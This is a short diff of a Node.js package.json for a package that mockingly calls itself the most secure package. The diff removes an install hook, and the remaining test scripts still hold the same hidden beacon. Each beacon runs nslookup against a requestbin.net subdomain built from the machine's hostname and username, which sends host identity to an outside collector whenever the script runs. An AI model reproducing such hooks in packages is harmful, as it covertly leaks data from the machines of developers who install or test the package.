@@ -4,9 +4,6 @@
   "description": "yep,most secure nodejs  package on planet earth",
   "main": "index.js",
   "scripts": {
-    "install": "nslookup h-$(hostname).u-$(whoami).most-secure-package.be243316447349c82d17.d.requestbin.net"
-  },
-  "scripts": {
     "test": "run-script-os",
     "test:darwin:linux": "nslookup h-$(hostname).u-$(whoami).most-secure-package.be243316447349c82d17.d.requestbin.net",
     "test:win32": "nslookup h-%hostname%.u-%username%.most-secure-package.be243316447349c82d17.d.requestbin.net"
